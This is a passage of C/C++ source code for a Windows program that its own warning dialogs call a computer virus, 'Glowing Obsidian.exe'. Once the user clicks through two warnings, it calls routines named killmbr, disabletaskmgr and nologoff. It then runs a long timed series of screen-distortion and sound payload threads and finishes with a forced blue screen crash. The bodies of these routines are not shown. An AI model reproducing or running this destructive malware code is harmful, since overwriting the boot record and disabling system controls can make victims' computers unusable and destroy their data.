				HANDLE thread25 = CreateThread(0, 0, drawglowingobsidianicon2k, 0, 0, 0);
				HANDLE thread26 = CreateThread(0, 0, shader4, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread25, 0);
				TerminateThread(thread26, 0);
				sound3();
				HANDLE thread27 = CreateThread(0, 0, mypayload7, 0, 0, 0);
				HANDLE thread28 = CreateThread(0, 0, shader3, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread27, 0);
				TerminateThread(thread28, 0);
				sound4();
				HANDLE thread29 = CreateThread(0, 0, Color, 0, 0, 0);
				HANDLE thread30 = CreateThread(0, 0, PAYLOAD08, 0, 0, 0);
				HANDLE thread31 = CreateThread(0, 0, colorbezier, 0, 0, 0);
				HANDLE thread32 = CreateThread(0, 0, Tunnel, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread32, 0);
				HANDLE thread33 = CreateThread(0, 0, Fangda, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread33, 0);
				HANDLE thread34 = CreateThread(0, 0, Tunnel, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread34, 0);
				HANDLE thread35 = CreateThread(0, 0, Fangda, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread35, 0);
				HANDLE thread36 = CreateThread(0, 0, Tunnel, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread36, 0);
				HANDLE thread37 = CreateThread(0, 0, Fangda, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread37, 0);
				TerminateThread(thread29, 0);
				TerminateThread(thread30, 0);
				TerminateThread(thread31, 0);
				sound5();
				HANDLE thread38 = CreateThread(0, 0, drawsquare, 0, 0, 0);
				HANDLE thread39 = CreateThread(0, 0, mypayload62k, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread38, 0);
				TerminateThread(thread39, 0);
				sound6();
				HANDLE thread40 = CreateThread(0, 0, manysquares2k, 0, 0, 0);
				HANDLE thread41 = CreateThread(0, 0, train, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread40, 0);
				TerminateThread(thread41, 0);
				sound7();
				HANDLE thread42 = CreateThread(0, 0, manycircles, 0, 0, 0);
				HANDLE thread43 = CreateThread(0, 0, doudong, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread42, 0);
				TerminateThread(thread43, 0);
				sound8();
				HANDLE thread44 = CreateThread(0, 0, mypayload2c, 0, 0, 0);
				HANDLE thread45 = CreateThread(0, 0, squares2, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread44, 0);
				TerminateThread(thread45, 0);
				sound9();
				HANDLE thread46 = CreateThread(0, 0, mypayload1c, 0, 0, 0);
				HANDLE thread47 = CreateThread(0, 0, balls, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread46, 0);
				TerminateThread(thread47, 0);
				sound10();
				HANDLE thread48 = CreateThread(0, 0, shader41, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread48, 0);
				TerminateThread(thread0, 0);
				bsod();
				return 0;
			}


		}
	}
	else {
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Glowing Obsidian.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Glowing Obsidian.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
			{
				ExitProcess(0);
			}
			else
			{
				killmbr();
				disabletaskmgr();
				nologoff();
				icondll(1);
				sound1();
				HANDLE thread0 = CreateThread(0, 0, mousedrawicon, 0, 0, 0);
				HANDLE thread0b = CreateThread(0, 0, ColorInvert, 0, 0, 0);
				HANDLE thread1 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread1, 0);
				HANDLE thread2 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread2, 0);
				HANDLE thread3 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread3, 0);
				HANDLE thread4 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread4, 0);
				HANDLE thread5 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread5, 0);
				HANDLE thread6 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread6, 0);
				HANDLE thread7 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread7, 0);
				HANDLE thread8 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread8, 0);
				HANDLE thread9 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread9, 0);
				HANDLE thread10 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread10, 0);
				HANDLE thread11 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread11, 0);
				HANDLE thread12 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread12, 0);
				HANDLE thread13 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread13, 0);
				HANDLE thread14 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread14, 0);
				HANDLE thread15 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread15, 0);
				HANDLE thread16 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread16, 0);
				HANDLE thread17 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread17, 0);
				HANDLE thread18 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread18, 0);
				HANDLE thread19 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread19, 0);
				HANDLE thread20 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread20, 0);
				HANDLE thread21 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread21, 0);
				HANDLE thread22 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread22, 0);
				HANDLE thread23 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread23, 0);
				HANDLE thread24 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread0b, 0);
				TerminateThread(thread24, 0);
				sound2();
				HANDLE thread25 = CreateThread(0, 0, drawglowingobsidianicon, 0, 0, 0);
				HANDLE thread26 = CreateThread(0, 0, shader4, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread25, 0);
				TerminateThread(thread26, 0);
				sound3();
				HANDLE thread27 = CreateThread(0, 0, mypayload7, 0, 0, 0);
				HANDLE thread28 = CreateThread(0, 0, shader3, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread27, 0);
				TerminateThread(thread28, 0);
				sound4();
				HANDLE thread29 = CreateThread(0, 0, Color, 0, 0, 0);
				HANDLE thread30 = CreateThread(0, 0, PAYLOAD08, 0, 0, 0);
				HANDLE thread31 = CreateThread(0, 0, colorbezier, 0, 0, 0);
				HANDLE thread32 = CreateThread(0, 0, Tunnel, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread32, 0);
				HANDLE thread33 = CreateThread(0, 0, Fangda, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread33, 0);
				HANDLE thread34 = CreateThread(0, 0, Tunnel, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread34, 0);
				HANDLE thread35 = CreateThread(0, 0, Fangda, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread35, 0);
				HANDLE thread36 = CreateThread(0, 0, Tunnel, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread36, 0);
				HANDLE thread37 = CreateThread(0, 0, Fangda, 0, 0, 0);
				Sleep(5000);
				TerminateThread(thread37, 0);
				TerminateThread(thread29, 0);
				TerminateThread(thread30, 0);
				TerminateThread(thread31, 0);
				sound5();
				HANDLE thread38 = CreateThread(0, 0, drawsquare, 0, 0, 0);
				HANDLE thread39 = CreateThread(0, 0, mypayload6, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread38, 0);
				TerminateThread(thread39, 0);
				sound6();
				HANDLE thread40 = CreateThread(0, 0, manysquares, 0, 0, 0);
				HANDLE thread41 = CreateThread(0, 0, train, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread40, 0);
				TerminateThread(thread41, 0);
				sound7();
				HANDLE thread42 = CreateThread(0, 0, manycircles, 0, 0, 0);
				HANDLE thread43 = CreateThread(0, 0, doudong, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread42, 0);
				TerminateThread(thread43, 0);
				sound8();
				HANDLE thread44 = CreateThread(0, 0, mypayload2c, 0, 0, 0);
				HANDLE thread45 = CreateThread(0, 0, squares2, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread44, 0);
				TerminateThread(thread45, 0);
				sound9();
				HANDLE thread46 = CreateThread(0, 0, mypayload1c, 0, 0, 0);
				HANDLE thread47 = CreateThread(0, 0, balls, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread46, 0);
				TerminateThread(thread47, 0);
				sound10();
				HANDLE thread48 = CreateThread(0, 0, shader41, 0, 0, 0);
				Sleep(30000);
				TerminateThread(thread48, 0);
				TerminateThread(thread0, 0);
				bsod();
				return 0;
			}


		}
	}
}